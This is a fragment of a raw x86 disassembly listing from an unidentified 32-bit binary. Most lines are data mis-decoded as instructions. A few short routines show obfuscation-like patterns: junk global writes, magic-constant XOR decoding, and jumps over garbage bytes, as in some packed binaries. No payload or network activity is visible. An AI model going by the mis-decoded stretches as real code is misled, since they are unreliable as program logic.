  408260:	push   eax
  408261:	mov    ds:0x4b002122,eax
  408266:	pop    ss
  408267:	or     BYTE PTR [esi-0x8],ah
  40826a:	ins    BYTE PTR es:[edi],dx
  40826b:	xchg   BYTE PTR [ebx+ecx*1],ch
  40826e:	jo     0x40825d
  408270:	adc    BYTE PTR [ecx-0x2f],bl
  408273:	sub    esp,DWORD PTR [edi-0x21]
  408276:	sub    al,0x60
  408278:	outs   dx,BYTE PTR ds:[esi]
  408279:	fcomp  DWORD PTR [edx+edi*2]
  40827c:	adc    al,0x83
  40827e:	call   0xa39abe87
  408283:	mov    bl,0xb7
  408285:	into   
  408286:	int3   
  408287:	and    DWORD PTR [eax-0xb],edx
  40828a:	int3   
  40828b:	pusha  
  40828c:	out    dx,al
  40828d:	fmulp  st(1),st
  40828f:	loopne 0x408215
  408291:	add    eax,0x3121f0e5
  408296:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408297:	cmp    DWORD PTR [edi-0x65],esp
  40829a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40829b:	sti    
  40829c:	xlat   BYTE PTR ds:[ebx]
  40829d:	cmp    eax,0x6b7ea577
  4082a2:	arpl   WORD PTR fs:[edx],cx
  4082a5:	in     eax,0xd0
  4082a7:	jl     0x4082ae
  4082a9:	jb     0x408289
  4082ab:	xor    cl,BYTE PTR [edi-0x13]
  4082ae:	iret   
  4082af:	mov    al,BYTE PTR [edi+edx*4-0x4623674c]
  4082b6:	cmp    eax,0xc795aab4
  4082bb:	mov    al,ds:0xfa11e95f
  4082c0:	push   0x5f
  4082c2:	push   ebx
  4082c3:	pop    esp
  4082c4:	stc    
  4082c5:	dec    edi
  4082c6:	clc    
  4082c7:	xchg   BYTE PTR ds:0x719659d9,ch
  4082cd:	mov    ds:0x51a6b8c6,al
  4082d2:	dec    ebx
  4082d3:	test   eax,0x541786c8
  4082d8:	push   ss
  4082d9:	xor    DWORD PTR [ecx+0x57],ecx
  4082dc:	imul   dl
  4082de:	pop    ecx
  4082df:	and    esp,0x8a4a188
  4082e5:	(bad)  
  4082e6:	mov    DWORD PTR [edi+0x3f],0x15dbf80d
  4082ed:	nop
  4082ee:	add    BYTE PTR [ecx-0x9862bce],dl
  4082f4:	xchg   BYTE PTR [ebp-0x4f],ch
  4082f7:	xchg   edx,eax
  4082f8:	mov    dh,0x5e
  4082fa:	lock idiv DWORD PTR [eax+0x5731eee]
  408301:	or     BYTE PTR [ecx],bl
  408303:	scas   al,BYTE PTR es:[edi]
  408304:	in     eax,0xba
  408306:	pop    ss
  408307:	and    al,BYTE PTR [edx-0x10dc06cb]
  40830d:	xchg   edx,eax
  40830e:	and    BYTE PTR [edx+0x639fe341],dl
  408314:	sub    edi,DWORD PTR [edx+edx*1+0x285210e9]
  40831b:	repz sahf 
  40831d:	xor    eax,0xb3a20b91
  408322:	repnz pop ss
  408324:	maskmovq mm4,(bad)
  408325:	mul    DWORD PTR [esi-0x28]
  408328:	push   0xffffff95
  40832a:	inc    DWORD PTR [edx]
  40832c:	lea    eax,[eax+edx*1+0x32729d]
  408333:	mov    DWORD PTR [ebp+0x8],eax
  408336:	inc    DWORD PTR [ebp+0xc]
  408339:	jmp    0x407e52
  40833e:	mov    eax,DWORD PTR [ebp-0x10]
  408341:	xor    eax,ecx
  408343:	mov    ecx,DWORD PTR [ebp+0x10]
  408346:	add    eax,esi
  408348:	mov    DWORD PTR [ecx],eax
  40834a:	pop    esi
  40834b:	leave  
  40834c:	ret    0xc
  40834f:	push   ebp
  408350:	mov    ebp,esp
  408352:	push   ecx
  408353:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40835a:	neg    eax
  40835c:	mov    eax,DWORD PTR [ebp-0x4]
  40835f:	movzx  ecx,WORD PTR ds:0x42e772
  408366:	adc    DWORD PTR ds:0x42e762,ecx
  40836c:	mov    edx,DWORD PTR [ebp+0x10]
  40836f:	mov    ecx,0x7510856
  408374:	sub    DWORD PTR ds:0x430542,0x4d69
  40837e:	xor    eax,ecx
  408380:	add    eax,0x32729d
  408385:	adc    DWORD PTR ds:0x42e76e,0x62f9
  40838f:	mov    DWORD PTR [edx],eax
  408391:	mov    eax,DWORD PTR [ebp+0xc]
  408394:	adc    edx,DWORD PTR ds:0x42e76e
  40839a:	xor    eax,ecx
  40839c:	or     DWORD PTR ds:0x4304a6,ecx
  4083a2:	push   esi
  4083a3:	movzx  esi,BYTE PTR ds:0x43048a
  4083aa:	or     DWORD PTR ds:0x42ee0c,esi
  4083b0:	mov    esi,DWORD PTR [ebp+0x10]
  4083b3:	adc    DWORD PTR ds:0x42ee10,0x7d94
  4083bd:	mov    edx,0x32729d
  4083c2:	add    eax,edx
  4083c4:	mov    DWORD PTR [esi+0x4],eax
  4083c7:	xor    eax,eax
  4083c9:	mov    eax,DWORD PTR [ebp+0x14]
  4083cc:	mov    esi,DWORD PTR [ebp+0x10]
  4083cf:	mov    DWORD PTR [esi+0x8],eax
  4083d2:	or     DWORD PTR ds:0x43048e,ebx
  4083d8:	mov    eax,DWORD PTR [ebp+0x18]
  4083db:	dec    esi
  4083dc:	mov    esi,DWORD PTR [ebp+0x10]
  4083df:	sbb    DWORD PTR ds:0x42e766,0xab4
  4083e9:	mov    DWORD PTR [esi+0xc],eax
  4083ec:	mov    eax,DWORD PTR [ebp+0x1c]
  4083ef:	adc    DWORD PTR ds:0x43049a,ebx
  4083f5:	mov    esi,DWORD PTR [ebp+0x10]
  4083f8:	or     DWORD PTR ds:0x42e776,0x42e76e
  408402:	mov    DWORD PTR [esi+0x10],eax
  408405:	adc    DWORD PTR ds:0x42e76e,edi
  40840b:	mov    eax,eax
  40840d:	and    DWORD PTR ds:0x43048e,0x0
  408417:	mov    esi,DWORD PTR ds:0x43048e
  40841d:	inc    esi
  40841e:	mov    DWORD PTR ds:0x43048e,esi
  408424:	cmp    DWORD PTR ds:0x43048e,0x17
  40842b:	jne    0x40844d
  408431:	push   DWORD PTR [ebp-0x24]
  408434:	push   0x2fa6
  408439:	push   DWORD PTR [ebp-0x28]
  40843c:	push   DWORD PTR [ebp-0x10]
  40843f:	push   DWORD PTR [ebp-0x14]
  408442:	push   0x162f
  408447:	call   DWORD PTR ds:0x42ea08
  40844d:	cmp    DWORD PTR ds:0x43048e,0x15
  408454:	jb     0x408417
  40845a:	mov    eax,DWORD PTR [ebp+0x8]
  40845d:	xor    eax,ecx
  40845f:	add    eax,edx
  408461:	pop    esi
  408462:	leave  
  408463:	ret    0x18
  408466:	push   ebp
  408467:	mov    ebp,esp
  408469:	mov    eax,DWORD PTR [ebp+0xc]
  40846c:	jmp    0x40876b
  408471:	cs leave 
  408473:	or     DWORD PTR [edi+0x69204779],0xc097db4f
  40847d:	pop    edi
  40847e:	ficomp DWORD PTR [edx+0x7edc6188]
  408484:	jle    0x4084d6
  408486:	jo     0x408506
  408488:	jle    0x4084c0
  40848a:	daa    
  40848b:	pop    eax
  40848c:	out    dx,al
  40848d:	pop    edi
  40848e:	addr16 pop esi
  408490:	fwait
  408491:	pop    esi
  408492:	stos   BYTE PTR es:[edi],al
  408493:	(bad)  
  408494:	sub    ebx,edi
  408496:	add    bh,ah
  408498:	push   ebp
  408499:	sahf   
  40849a:	xchg   edi,eax
  40849b:	mov    al,0xbd
  40849d:	pop    edx
  40849e:	(bad)  
  40849f:	mov    eax,0x7756603d
  4084a4:	mov    bl,0xac
  4084a6:	enter  0xbecb,0x2b
  4084aa:	dec    edi
  4084ab:	ret    
  4084ac:	sar    DWORD PTR [ebx-0x54],1
  4084af:	shl    DWORD PTR [edi],1
  4084b1:	xchg   ecx,eax
  4084b2:	rol    BYTE PTR [ebx-0x76],1
  4084b5:	sub    edx,edi
  4084b7:	popa   
  4084b8:	inc    ebp
  4084b9:	add    eax,0x714d3a94
  4084be:	dec    esp
  4084bf:	push   cs
  4084c0:	xor    BYTE PTR [ebx-0x103f507b],bh
  4084c6:	lock xchg ecx,eax
  4084c8:	xor    BYTE PTR ds:0x283029ec,cl
  4084ce:	jmp    0xfd13:0xdf61d67c
  4084d5:	xchg   esp,eax
  4084d6:	fild   QWORD PTR [ebp+0x62]
  4084d9:	stc    
  4084da:	call   0xd751b3b7
  4084df:	aas    
  4084e0:	or     BYTE PTR [esi+0x4a],bh
  4084e3:	sub    al,0x19
  4084e5:	inc    ecx
  4084e6:	mov    ch,0xda
  4084e8:	clc    
  4084e9:	fsub   QWORD PTR [eax-0x5b999ad1]
  4084ef:	and    al,0x60
  4084f1:	mov    ah,0xcb
  4084f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084f4:	scas   al,BYTE PTR es:[edi]
  4084f5:	(bad)
  4084f8:	test   edi,ecx
  4084fa:	sub    DWORD PTR [esp+ecx*2],eax
  4084fd:	jp     0x408533
  4084ff:	or     ebp,DWORD PTR [edi-0x3002f0b]
  408505:	jnp    0x4084f2
  408507:	xlat   BYTE PTR ds:[ebx]
  408508:	sub    ecx,DWORD PTR [ebx+ebp*2]
  40850b:	add    dl,cl
  40850d:	mov    bl,0xf1
  40850f:	(bad)  
  408510:	jmp    ecx
  408512:	repz mov esi,0x8f033068
  408518:	ins    DWORD PTR es:[edi],dx
  408519:	inc    edi
  40851a:	fistp  WORD PTR [ebx]
  40851c:	pushf  
  40851d:	mov    eax,DWORD PTR [edx-0x1]
  408520:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408521:	or     bh,BYTE PTR [esi]
  408523:	fdiv   DWORD PTR [ecx+0x5b]
  408526:	(bad)  
  408527:	fnstcw WORD PTR [esi-0x6d]
  40852a:	and    DWORD PTR [edx+0x70],ebp
  40852d:	pop    es
  40852e:	fstp   TBYTE PTR ds:0x53f594d
  408534:	inc    eax
  408535:	inc    ebp
  408536:	(bad)  
  408537:	jge    0x408589
  408539:	ins    BYTE PTR es:[edi],dx
  40853a:	in     al,0x3c
  40853c:	sbb    al,al
  40853e:	and    cl,dh
  408540:	sbb    al,0xf1
  408542:	fwait
  408543:	shr    BYTE PTR [eax],0x5d
  408546:	xor    ecx,DWORD PTR [ebx+eax*2]
  408549:	dec    edi
  40854a:	fsub   st,st(2)
  40854c:	cli    
  40854d:	leave  
  40854e:	mov    eax,0xc1321321
  408553:	stos   DWORD PTR es:[edi],eax
  408554:	push   ebp
  408555:	les    ebx,FWORD PTR [ebx+0x2a6aac58]
  40855b:	sbb    DWORD PTR [ebp+0x46],esp
  40855e:	jmp    0x9398172f
  408563:	xchg   eax,eax
  408565:	and    al,0xb5
  408567:	fdivr  QWORD PTR [esi]
  408569:	inc    ecx
  40856a:	out    dx,eax
  40856b:	jae    0x4085da
  40856d:	fnsave [ebp+ebp*1+0xe]
  408571:	scas   eax,DWORD PTR es:[edi]
  408572:	mov    edx,0x90c8129c
  408577:	cmc    
  408578:	mov    dl,0xf3
  40857a:	cli    
  40857b:	sbb    eax,0x565e2614
  408580:	sbb    eax,0x24cdaeee
  408585:	cli    
  408586:	fdivp  st(0),st
  408588:	ret    0x92ab
  40858b:	sbb    dh,BYTE PTR [esi+0x2a602846]
  408591:	dec    DWORD PTR [ecx+0x3d]
  408594:	nop
  408595:	mov    cl,BYTE PTR [ecx+0x27b87206]
  40859b:	pusha  
  40859c:	or     esp,DWORD PTR [eax]
  40859e:	pop    ss
  40859f:	xchg   ebx,eax
  4085a0:	sub    esi,DWORD PTR [ebx-0x59]
  4085a3:	jl     0x408595
  4085a5:	xor    eax,0xd2e9609
  4085aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085ab:	retf   0x1775
  4085ae:	xor    BYTE PTR [ecx+0x619530f1],0xbc
  4085b5:	and    ebp,DWORD PTR [eax-0x6a9f7428]
  4085bb:	push   0x2a
  4085bd:	xor    al,0x36
  4085bf:	mov    ds:0xf6182542,al
  4085c4:	jmp    0xe5326bb
  4085c9:	repz xchg edx,eax
  4085cb:	ins    BYTE PTR es:[edi],dx
  4085cc:	mov    ch,0x4c
  4085ce:	mov    ebp,0xc48446bd
  4085d3:	dec    edx
  4085d4:	mov    esi,0x8d7b282e
  4085d9:	push   ebp
  4085da:	fsubr  st(4),st
  4085dc:	std    
  4085dd:	jne    0x408565
  4085df:	mov    ch,0xe2
  4085e1:	aad    0xbb
  4085e3:	leave  
  4085e4:	shl    DWORD PTR [edx-0x5f],cl
  4085e7:	in     al,dx
  4085e8:	rcl    BYTE PTR [ebp+0x5f2651ba],1
  4085ee:	sbb    eax,0xe2a2c0e7
  4085f3:	(bad)  
  4085f4:	cld    
  4085f5:	sub    esp,ecx
  4085f7:	lahf   
  4085f8:	mov    al,0x3
  4085fa:	(bad)  [esi+0x46]
  4085fd:	xor    edi,ebx
  4085ff:	and    BYTE PTR [esi+0x63],dh
  408602:	sahf   
  408603:	inc    ebx
  408604:	cmp    al,0xbc
  408606:	sahf   
  408607:	xchg   edi,eax
  408608:	inc    edx
  408609:	aaa    
  40860a:	pop    eax
  40860b:	mov    BYTE PTR [eax-0x3df994c],bh
  408611:	and    DWORD PTR [esi-0x4c],ecx
  408614:	or     DWORD PTR [eax-0x72],eax
  408617:	int    0x52
  408619:	mov    cs,WORD PTR [ebp-0x35]
  40861c:	add    eax,0x3735ebb9
  408622:	dec    edx
  408623:	or     BYTE PTR [ebx-0x5c],al
  408626:	jecxz  0x40865b
  408628:	pop    esi
  408629:	outs   dx,DWORD PTR ds:[esi]
  40862a:	mov    esp,0x1c1b7e9c
  40862f:	xor    ch,BYTE PTR [edi]
  408631:	xchg   ebp,eax
  408632:	dec    esi
  408633:	xor    ebx,DWORD PTR [esi+eiz*2]
  408636:	pop    ecx
  408637:	push   ds
  408638:	test   eax,0xffcc4661
  40863d:	in     al,0xb1
  40863f:	dec    cx
  408641:	jno    0x408634
  408643:	out    0x26,al
  408645:	leave  
  408646:	pop    es
  408647:	dec    esi
  408648:	pop    edx
  408649:	inc    ch
  40864b:	jp     0x408678
  40864d:	fadd   DWORD PTR [eax-0x13]
  408650:	test   eax,0xb2a97611
  408655:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408656:	mov    ds:0xece91c48,eax
  40865b:	and    eax,0xef850a5b
  408660:	pop    esp
  408661:	xlat   BYTE PTR ds:[ebx]
  408662:	sbb    ah,BYTE PTR [edi-0xc57272d]
  408668:	xor    eax,0x66dbecf8
  40866d:	sbb    al,0xe8
  40866f:	ror    DWORD PTR ds:0x86281497,1
  408675:	or     BYTE PTR [esi+ecx*2],bl
  408678:	sbb    BYTE PTR [bx+0x53f6],ah
  40867d:	std    
  40867e:	ds repnz nop
  408681:	mov    eax,ds:0x167721c
  408686:	int3   
  408687:	imul   BYTE PTR [eax+0x28]
  40868a:	repz and DWORD PTR cs:[ebx-0x36],ecx
  40868f:	jno    0x408670
  408691:	mov    bh,0x40
  408693:	jecxz  0x4086c4
  408695:	aaa    
  408696:	cli    
  408697:	mov    DWORD PTR [esi],ebx
  408699:	popa   
  40869a:	cmp    dl,cl
  40869c:	ds dec eax
  40869e:	or     edi,DWORD PTR ds:0x8aba878f
  4086a4:	in     eax,0xd
  4086a6:	addr16 pop ecx
  4086a8:	inc    ebx
  4086a9:	enter  0x6307,0x8e
  4086ad:	push   esi
  4086ae:	repnz cli 
  4086b0:	sbb    dl,al
  4086b2:	ins    DWORD PTR es:[edi],dx
  4086b3:	jnp    0x40872c
  4086b5:	adc    eax,DWORD PTR [edx+eax*1-0x19]
  4086b9:	enter  0x7418,0xc
  4086bd:	dec    edi
  4086bf:	mov    ecx,0xf4149931
  4086c4:	lods   eax,DWORD PTR ds:[esi]
  4086c5:	mov    DWORD PTR [eax],ebx
  4086c7:	and    edx,DWORD PTR [ebp+0x67]
  4086ca:	or     DWORD PTR [ecx+0x69],esp
  4086cd:	sub    BYTE PTR [eax+eiz*4-0x1e],dh
  4086d1:	outs   dx,BYTE PTR ds:[esi]
  4086d2:	push   0x69
  4086d4:	xchg   edx,eax
  4086d5:	mov    ch,0xa6
  4086d7:	pop    esp
  4086d8:	icebp  
  4086d9:	pop    eax
  4086da:	adc    eax,0xab187b9b
  4086df:	iret   
  4086e0:	dec    esp
  4086e1:	mov    ds:0xcd1a3077,eax
  4086e6:	aas    
  4086e7:	fwait
  4086e8:	syscall 
  4086ea:	scas   eax,DWORD PTR es:[edi]
  4086eb:	mov    ecx,0x9548a39a
  4086f0:	rcl    esi,1
  4086f2:	or     DWORD PTR gs:[edi],esp
  4086f5:	outs   dx,DWORD PTR ds:[esi]
  4086f6:	mov    dl,0x16
  4086f8:	retf   
  4086f9:	out    dx,al
  4086fa:	jmp    0x408702
  4086fc:	mov    esi,0xf9c664dd
  408701:	mul    DWORD PTR [edi+ecx*1+0x43]
  408705:	and    BYTE PTR [edx-0x8],ah
  408708:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408709:	dec    ebp
  40870a:	sbb    al,ch
  40870c:	dec    ecx
  40870d:	and    al,BYTE PTR ds:0xb011f9a
  408713:	shl    ebp,0x75
  408716:	mov    esp,0x798d681f
  40871b:	fadd   QWORD PTR [edi-0x292cdc9e]
  408721:	out    0xdb,eax
  408723:	outs   dx,BYTE PTR ds:[esi]
  408724:	inc    ebp
  408725:	test   al,0x2
  408727:	aaa    
  408728:	jno    0x40873f
  40872a:	pusha  
  40872b:	in     al,0x81
  40872d:	rol    ah,0xcc
  408730:	cwde   
  408731:	sbb    eax,0xe143cfdb
  408736:	dec    edi
  408737:	mov    eax,0xc18dfbb9
  40873c:	cs dec ebx
  40873e:	mov    eax,ds:0xee1be005
  408743:	mov    bl,BYTE PTR [ecx-0x46]
  408746:	jmp    0xc059:0x70b74725
  40874d:	fdiv   DWORD PTR [eax+ebx*2-0x48]
  408751:	pop    edi
  408752:	ror    BYTE PTR [edi+0x3e721a74],cl
  408758:	ror    DWORD PTR [edi],cl
  40875a:	xchg   ebx,eax
  40875b:	repz xchg edi,eax
  40875d:	popf   
  40875e:	mov    esp,0x768c169d
  408763:	mov    ds:0xbd9f37fb,al
  408768:	arpl   di,bx
  40876a:	inc    esp
  40876b:	xor    edx,edx
  40876d:	mov    ecx,0x7264fcad
  408772:	div    ecx
  408774:	mov    ecx,DWORD PTR [ebp+0x10]
  408777:	and    ecx,eax
  408779:	jmp    0x408a78
  40877e:	out    0xd4,eax
  408780:	xchg   BYTE PTR [ebx+0x6cfb7d9d],al
  408786:	imul   edx,ecx,0xfffffff2
  408789:	bound  ebx,QWORD PTR [eax+0x430f185d]
  40878f:	fistp  QWORD PTR [esi+0x7e]
  408792:	push   eax
  408793:	jo     0x408813
  408795:	jle    0x408808
  408797:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408799:	mov    ch,0x4
  40879b:	test   DWORD PTR [ebx+0x75812b30],edi
  4087a1:	and    eax,0x289e269b
  4087a6:	in     eax,0x58
  4087a8:	mov    cl,0xed
  4087aa:	cld    
  4087ab:	cmp    BYTE PTR [esi+0x2d],al
  4087ae:	imul   ebx,DWORD PTR [bx+di-0x60a1],0xffffffeb
  4087b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087b5:	jl     0x408804
  4087b7:	push   edi
  4087b8:	cdq    
  4087b9:	xchg   esi,eax
  4087ba:	and    esi,ebx
  4087bc:	adc    al,BYTE PTR [eax+0x5c03b66e]
  4087c2:	mov    bl,0x3c
  4087c4:	or     DWORD PTR [ebp+0x1daae691],0xffffff80
  4087cb:	fisubr DWORD PTR [ebp+0x7b0b5f46]
  4087d2:	in     al,0xc
  4087d4:	sbb    DWORD PTR [eax+0x52],ebp
  4087d7:	pop    edi
  4087d8:	jl     0x408842
  4087da:	out    0xa7,eax
  4087dc:	mov    cl,0x1f
  4087de:	adc    dh,BYTE PTR [edi+0x57]
  4087e1:	sbb    eax,0x615063be
  4087e6:	bound  ebx,QWORD PTR [ebx]
  4087e8:	fsubr  DWORD PTR [ebx+eax*8-0x36]
  4087ec:	fisub  DWORD PTR [edi-0x6]
  4087ef:	sub    eax,0x7b8fdc5b
  4087f4:	jne    0x4087ee
  4087f6:	in     al,0x89
  4087f8:	cmp    ebx,0x97159dbf
  4087fe:	shl    BYTE PTR ds:0xa11f567a,0x3a
  408805:	sar    BYTE PTR [ebx],1
  408807:	inc    edx
  408808:	push   ebx
  408809:	clc    
  40880a:	xor    DWORD PTR [edx-0xb],ebp
  40880d:	push   ebx
  40880e:	jp     0x4087ab
  408810:	jae    0x40887b
  408812:	cs neg ah
  408815:	xor    ch,bh
  408817:	pop    esp
  408818:	daa    
  408819:	call   DWORD PTR [esi]
  40881b:	out    0x35,eax
  40881d:	icebp  
  40881e:	push   cs
  40881f:	test   eax,0x8b4f9ebd
  408824:	xor    al,BYTE PTR [eax]
  408826:	dec    eax
  408827:	fsubr  QWORD PTR fs:[edx+0x5d8f9239]
  40882e:	add    BYTE PTR [esi+0x54],cl
  408831:	rcr    DWORD PTR [ebp+0x5eb570f2],cl
  408837:	dec    edi
  408838:	int3   
  408839:	xchg   ecx,eax
  40883a:	loopne 0x4087d5
  40883c:	sbb    DWORD PTR [esi],edi
  40883e:	ror    DWORD PTR cs:[ecx-0x6e],cl
  408842:	mul    BYTE PTR [ecx+0x61]
  408845:	add    BYTE PTR [ebx-0x5e6f2a82],ah
  40884b:	test   BYTE PTR [edi+eax*2+0x6ef0edbb],cl
  408852:	push   esi
  408853:	xchg   esp,eax
  408854:	nop
  408855:	(bad)  
  408856:	mov    esi,0xa02cb250
  40885b:	cdq    
  40885c:	data16 jo 0x4087f1
  40885f:	mov    edx,0xaf7b4fb6
  408864:	daa    
  408865:	mov    al,0x8b
  408867:	inc    ecx
  408868:	add    DWORD PTR [edx-0x29],esi
  40886b:	dec    eax
  40886c:	add    bh,bl
  40886e:	jb     0x4087f0
  408870:	je     0x408837
  408872:	clc    
  408873:	sar    dl,1
  408875:	scas   eax,DWORD PTR es:[edi]
  408876:	dec    eax
  408877:	xchg   ebx,eax
  408878:	xchg   edi,eax
  408879:	inc    ebp
  40887a:	gs icebp 
  40887c:	ds bound eax,QWORD PTR ss:[edx]
  408880:	fwait
  408881:	mov    WORD PTR [ebx+0x42e88461],ds
  408887:	mov    edi,0x5981dbc7
  40888c:	sbb    esi,edx
  40888e:	lods   eax,DWORD PTR ds:[esi]
  40888f:	jle    0x408892
  408891:	cmp    BYTE PTR [edi-0x32],cl
  408894:	push   ebp
  408895:	mov    eax,0xb8c12d66
  40889a:	in     eax,dx
  40889b:	add    esi,esp
  40889d:	mov    ds:0x338083d4,al
  4088a2:	js     0x4088aa
  4088a4:	jae    0x408912
  4088a6:	je     0x408847
  4088a8:	push   edx
  4088a9:	ins    DWORD PTR es:[edi],dx
  4088aa:	mov    dl,0x9c
  4088ac:	mov    eax,0xd95f7f0e
  4088b1:	dec    esi
  4088b2:	sub    al,0x3f
  4088b4:	rcr    dh,0x16
  4088b7:	sahf   
  4088b8:	js     0x408926
  4088ba:	repnz add DWORD PTR [ebp+0x76],esp
  4088be:	jge    0x40885f
  4088c0:	outs   dx,BYTE PTR ds:[esi]
  4088c1:	mov    ah,BYTE PTR [edi]
  4088c3:	jmp    0x408876
  4088c5:	ficom  DWORD PTR [edi-0x3a]
  4088c8:	call   0x9d93aec5
  4088cd:	adc    BYTE PTR [eax-0x9],bl
  4088d0:	mov    edx,0x71383497
  4088d5:	in     al,0xe8
  4088d7:	xlat   BYTE PTR ds:[ebx]
  4088d8:	xchg   ebx,eax
  4088d9:	lods   al,BYTE PTR ds:[esi]
  4088da:	mov    dh,0xe3
  4088dc:	jecxz  0x4088a2
  4088de:	sbb    DWORD PTR [esi-0x1f894203],edi
  4088e4:	mov    esp,0xcd878dac
  4088e9:	xor    bl,dl
  4088eb:	retf   
  4088ec:	xchg   ebp,eax
  4088ed:	call   0x59db5131
  4088f2:	mov    eax,0xbb2263f7
  4088f7:	push   0xfffffffc
  4088f9:	je     0x4088ce
  4088fb:	loope  0x4088cc
  4088fd:	gs adc cl,al
  408900:	and    al,0x5c
  408903:	push   0x3b
  408905:	hlt    
  408906:	jl     0x4088b3
  408908:	cmp    eax,DWORD PTR [esi-0x44]
  40890b:	cmp    bh,BYTE PTR [esi-0x11cb72b3]
  408911:	pop    esi
  408912:	mov    ch,0x71
  408914:	jnp    0x4088da
  408916:	ds pop eax
  408918:	mov    edx,0xfdeb7bd1
  40891d:	dec    ecx
  40891e:	into   
  40891f:	push   ss
  408920:	ds sahf 
  408922:	scas   eax,DWORD PTR es:[edi]
  408923:	inc    esi
  408924:	test   eax,0x48b65bd7
  408929:	clc    
  40892a:	jmp    0xfc03d201
  40892f:	and    BYTE PTR [esi-0x1c],bh
  408932:	sbb    esp,DWORD PTR [esi+0x60]
  408935:	pop    esi
  408936:	fistp  WORD PTR [ecx+0x2ec2fee3]
  40893c:	push   esi
  40893d:	adc    BYTE PTR [ebx-0x606ae686],ch
  408943:	inc    esp
  408944:	push   ds
  408945:	jmp    0x34db:0xc1f3634f
  40894c:	jno    0x408982
  40894e:	push   eax
  40894f:	mov    esi,0xde25a9cf
  408954:	jb     0x4089b6
  408956:	gs sti 
  408958:	push   edx
  408959:	(bad)  
  40895a:	out    0x10,eax
  40895c:	repnz and DWORD PTR [edi],ebp
  40895f:	jbe    0x4089a8
  408961:	push   ss
  408962:	int3   
  408963:	adc    ch,BYTE PTR [ebx]
  408965:	jl     0x9381085a
  40896b:	enter  0xd404,0x12
  40896f:	call   0x2fde8e67
  408974:	inc    eax
  408975:	clc    
  408976:	adc    ah,BYTE PTR [edx+esi*8-0x4]
  40897a:	stos   BYTE PTR es:[edi],al
  40897b:	xor    eax,0x1fe20c60
  408980:	nop
  408981:	inc    esp
  408982:	out    0x39,al
  408984:	jge    0x40898e
  408986:	out    dx,eax
  408987:	push   eax
  408988:	(bad)  
  40898a:	retf   0xe132
  40898d:	xor    DWORD PTR [edi+0x6fae2af2],eax
  408993:	jp     0x4089d0
  408995:	jne    0x40899b
  408997:	dec    edi
  408998:	pop    ecx
  408999:	repz xchg dl,dl
  40899c:	(bad)  
  40899d:	jp     0x4089d5
  40899f:	push   esi
  4089a0:	iret   
  4089a1:	leave  
  4089a2:	ins    DWORD PTR es:[edi],dx
  4089a3:	rol    DWORD PTR [esi+0x75685006],cl
  4089a9:	pop    ds
  4089aa:	jg     0x408996
  4089ac:	add    DWORD PTR [ebp+0x3d],esp
  4089af:	adc    BYTE PTR [edi+ebp*4+0x7ed7a4c2],bl
  4089b6:	ins    BYTE PTR es:[edi],dx
  4089b7:	jl     0x408996
  4089b9:	pop    edx
  4089ba:	and    al,0x89
  4089bc:	push   ds
  4089bd:	sahf   
  4089be:	add    bh,BYTE PTR [edx-0x5d574429]
  4089c4:	lea    edx,cs:0xaeaf5f32
  4089cb:	leave  
  4089cc:	pop    esi
  4089cd:	dec    ebx
  4089ce:	xchg   esi,eax
  4089cf:	cmp    DWORD PTR ds:0xdc863a02,ebx
  4089d5:	outs   dx,BYTE PTR ds:[esi]
  4089d6:	call   FWORD PTR [edx]
  4089d8:	mov    eax,0xec598c33
  4089dd:	(bad)
  4089e1:	sub    DWORD PTR [ebx],ebp
  4089e3:	stos   BYTE PTR es:[edi],al
  4089e4:	bound  esi,QWORD PTR [edx-0x5de2ddeb]
  4089ea:	jns    0x408a3a
  4089ec:	jmp    0xcd5f:0xd024c55b
  4089f3:	ins    BYTE PTR es:[edi],dx
  4089f4:	jno    0x4089a3
  4089f6:	mov    es,ebp
  4089f8:	pop    edx
  4089f9:	xor    eax,0x87e34b8e
  4089fe:	cmp    DWORD PTR [ebx],edi
  408a00:	fist   DWORD PTR [edi]
  408a02:	fimul  DWORD PTR [esi]
  408a04:	push   esi
  408a05:	adc    ebp,DWORD PTR ds:0x5a96e3ed
  408a0b:	mov    DWORD PTR [ebx-0x55],ebx
  408a0e:	out    0x9c,al
  408a10:	cmp    eax,0xb05f08f
  408a15:	jge    0x4089e0
  408a17:	inc    ecx
  408a18:	jno    0x408a78
  408a1a:	mov    dl,0x2
  408a1c:	out    0xfa,al
  408a1e:	push   cs
  408a1f:	sub    eax,0xd13a6a63
  408a24:	sub    al,0xc0
  408a26:	add    ch,BYTE PTR [ecx+0x70ea1a85]
  408a2c:	pop    es
  408a2d:	add    ax,WORD PTR [eax]
  408a30:	lds    esi,FWORD PTR [eax]
  408a32:	in     eax,dx
  408a33:	dec    ecx
  408a34:	xor    BYTE PTR [ebx+0x376a4a0e],dh
  408a3a:	ins    DWORD PTR es:[edi],dx
  408a3b:	or     al,0x3e
  408a3d:	push   es
  408a3e:	in     al,dx
  408a3f:	in     al,0x86
  408a41:	lds    edi,FWORD PTR [eax+0x6f]
  408a44:	or     al,0xad
  408a46:	iret   
  408a47:	push   0x11
  408a49:	ror    DWORD PTR [eax+0x5b8449e7],1
  408a4f:	fsubr  QWORD PTR ss:[edx+0x1b]
  408a53:	in     eax,0x2c
  408a55:	add    eax,0xe77c5728
  408a5a:	xchg   edx,eax
  408a5b:	cmp    DWORD PTR [ebp+0x5f],edi
  408a5e:	jmp    0x84d6eab5
  408a63:	popf   
  408a64:	and    al,0x7
  408a66:	sahf   
  408a67:	nop
  408a68:	xor    eax,0x145c61a0
  408a6d:	data16 add BYTE PTR [edi+0x169f98fe],dl
  408a74:	pop    edi
  408a75:	dec    eax
  408a76:	mov    eax,ds:0x8fc981e5
  408a7b:	sbb    eax,0xc18b8116
  408a80:	pop    ebp
  408a81:	ret    0x18
  408a84:	push   ebp
  408a85:	mov    ebp,esp
  408a87:	push   ecx
  408a88:	mov    DWORD PTR ds:0x42e76a,0x1d
  408a92:	cmp    DWORD PTR ds:0x42e76a,0x0
  408a99:	je     0x408add
  408a9f:	cmp    DWORD PTR ds:0x42e76a,0x1f
  408aa6:	jne    0x408ac1
  408aac:	push   0x430496
